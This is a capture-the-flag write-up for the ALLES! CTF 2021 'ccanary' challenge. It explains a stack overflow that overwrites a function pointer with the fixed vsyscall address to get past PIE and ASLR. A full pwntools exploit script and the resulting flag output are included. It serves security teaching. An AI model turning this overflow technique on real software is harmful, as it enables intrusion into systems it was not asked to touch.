## ccanary

> Points: 133
>
> Solves: 89

### Description:
I'm using arch btw... ¯\_(ツ)_/¯

### Attachments:
```
ccanary  https://static.allesctf.net/1034e3b4626ce02001a330342be622edba032d07a8cbf6f0d3aecd4036370f40/ccanary
ccanary.c  https://static.allesctf.net/ffa321004f1a6f232e38e8d314920e290ee50cfce02d1632e4dfee8d0abf1c1d/ccanary.c
```

## Analysis:

The C language source code is provided below.
https://github.com/mito753/CTF/blob/main/2021/ALLES!_CTF_2021/Pwn_ccanary/ccanary.c

- We can enter character strings from 0x7fffffffdd99 in the stack state below.
- The flag can be displayed if the value (0x0000555555555210) of data.call_canary((a) part) is not destroyed and a non-zero value can be written to data.give_flag((b) part).
- However, since PIE and ASLA are valid, the address of the data.call_canary () function cannot be guessed.
```
0x7fffffffdd90:	0x00000000000000c2	0x79202d0a22414122
                                                 
0x7fffffffdda0:	0x31323032202c756f	0x0000000000000000
0x7fffffffddb0:	0x0000000000000000	0x0000555555555210
                                           (a)data.call_canary()                                
0x7fffffffddc0:	0x0000000000000000	0xc18083ccda1b7d00
                   (b)data.give_flag
0x7fffffffddd0:	0x00005555555553b0	0x00007ffff7a03bf7
```

## Solution:

By writing the following sys_time (0xc9) address (0xffffffffff600400) that is not affected by PIE and ASLA to data.call_canary (a part), 1 can be written to data.give_flag without causing a Segmentation fault.

```
gdb-peda$ x/10i 0xffffffffff600400
   0xffffffffff600400:	mov    rax,0xc9
   0xffffffffff600407:	syscall 
   0xffffffffff600409:	ret    
   0xffffffffff60040a:	int3
```

## Exploit code:
```python
from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './ccanary'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = process("ncat --ssl 7b0000007c7be7ad4dab5be5-ccanary.challenge.master.allesctf.net 31337", shell=True)
else:
  s = process(BINARY)
 
s.recvuntil("quote> ")

buf  = "A"*(0x1f)
buf += p64(0xffffffffff600400)  # sys_time
buf += p64(1)
s.sendline(buf)

s.interactive()
```

## Results:
```bash
mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_ccanary$ python solve.py r
[*] '/home/mito/CTF/ALLES!_CTF_2021/Pwn_ccanary/ccanary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/bin/sh': pid 60051
[*] Switching to interactive mode
good birb!
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Here's the flag:
ALLES!{th1s_m1ght_n0t_work_on_y0ur_syst3m_:^)}
```
